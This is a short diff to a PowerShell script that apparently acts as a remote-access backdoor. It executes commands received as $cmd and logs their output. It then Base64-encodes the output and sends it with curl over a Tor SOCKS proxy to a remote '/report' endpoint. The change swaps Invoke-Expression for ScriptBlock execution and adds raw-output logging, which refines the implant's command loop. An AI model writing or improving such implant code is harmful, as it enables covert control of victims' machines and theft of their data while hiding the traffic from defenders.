@@ -47,10 +47,10 @@ function main {
         if ($cmd -and $cmd -ne "noop") {
             try {
                 # Capture output including errors
-                $output = Invoke-Expression "$cmd | Out-String" 2>&1
+                $output = Invoke-Command -ScriptBlock ([ScriptBlock]::Create($cmd)) 2>&1 | Out-String
                 $outText = "SUCCESS: $output"
                 $outText | Out-File -Append -FilePath $log
-
+                "-----      DEBUG       ----- Raw Output: $output" | Out-File -Append -FilePath $log
                 $eOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($outText))
                 & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -J "Content-Type: text/plain" -d $eOutput "$url/report"
             }
